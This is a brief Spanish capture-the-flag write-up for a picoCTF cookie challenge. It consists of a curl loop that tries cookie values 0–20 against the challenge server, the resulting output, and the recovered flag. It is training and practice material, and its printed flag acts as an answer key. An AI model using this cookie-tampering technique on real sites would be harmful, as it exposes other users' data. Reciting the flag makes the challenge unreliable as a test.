## Descripcion



## Solucion
```
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -H "Cookie: name=$i" http://mercury.picoctf.net:29649/check; done | grep picoCTF


  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--      70  1779   70  1251    0     0   5362      0 --:--:-- --:--:-- --:--:--  534100  1779  100  1779    0     0   7578      0 --:--:-- --:--:-- --:--:--  7570
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1780  100  1780    0     0   9948      0 --:--:-- --:--:-- --:--:-- 10000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1780  100  1780    0     0  10120      0 --:--:-- --:--:-- --:--:-- 10171
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1776  100  1776    0     0   9771      0 --:--:-- --:--:-- --:--:--  9812
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1776  100  1776    0     0   9505      0 --:--:-- --:--:-- --:--:--  9548
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1779  100  1779    0     0   8696      0 --:--:-- --:--:-- --:--:--  8678
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1777  100  1777    0     0   9728      0 --:--:-- --:--:-- --:--:--  9763
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1771  100  1771    0     0   9876      0 --:--:-- --:--:-- --:--:--  9893
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1774  100  1774    0     0   9827      0 --:--:-- --:--:-- --:--:--  9855
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1770  100  1770    0     0   9907      0 --:--:-- --:--:-- --:--:-- 10000
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1774  100  1774    0     0   9219      0 --:--:-- --:--:-- --:--:--  9336
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1772  100  1772    0     0   9987      0 --:--:-- --:--:-- --:--:-- 10011
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1772  100  1772    0     0   9670      0 --:--:-- --:--:-- --:--:--  9736
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1774  100  1774    0     0  10023      0 --:--:-- --:--:-- --:--:-- 10079
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1770  100  1770    0     0   9639      0 --:--:-- --:--:-- --:--:--  9672
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1776  100  1776    0     0   9210      0 --:--:-- --:--:-- --:--:--  9202
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1774  100  1774    0     0   9792      0 --:--:-- --:--:-- --:--:--  9801
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1771  100  1771    0     0   9607      0 --:--:-- --:--:-- --:--:--  9677
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1184  100  1184    0     0   6525      0 --:--:-- --:--:-- --:--:--  6577
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}</code></p>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1774  100  1774    0     0   9748      0 --:--:-- --:--:-- --:--:--  9855
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--       0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     100  1773  100  1773    0     0   9700      0 --:--:-- --:--:-- --:--:--  9741

```

## Flag
picoCTF{3v3ry1_l0v3s_c00k135_a1f5bdb7}